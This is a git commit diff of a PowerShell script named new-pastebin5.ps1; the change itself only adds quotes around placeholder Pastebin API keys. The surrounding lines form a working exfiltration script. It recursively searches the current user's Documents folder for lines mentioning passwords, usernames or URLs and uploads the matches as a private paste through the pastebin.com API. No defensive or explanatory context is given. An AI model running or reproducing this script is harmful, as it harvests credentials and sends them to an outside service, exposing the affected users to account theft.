e0dfae096c4825dbf719d530d33b0f7f55dc08b7
Ken Vanden Branden <kenvdb@gmail.com>
2023-06-07 12:43:18 +0200

    Update new-pastebin5.ps1

--- new-pastebin5.ps1
+++ new-pastebin5.ps1
@@ -1,4 +1,4 @@
-$DevKey=PUT-DEVKEY-HERE;$UserKey=PUT-USER-KEY-HERE
+$DevKey="PUT-DEVKEY-HERE";$UserKey="PUT-USER-KEY-HERE"
 $Content = ConvertTo-Json (ls c:\users\$env:username\Documents -r | Select-String password,username,http | select line,path); $Title="pastebin3"
 $Body = @{ api_dev_key=$DevKey; api_user_key=$UserKey; api_paste_name=$Title;api_paste_code=$Content;api_paste_private="2";api_option="paste";}
 Invoke-WebRequest -Uri "https://pastebin.com/api/api_post.php" -UseBasicParsing -Body $Body -Method Post -OutFile $Title.txt
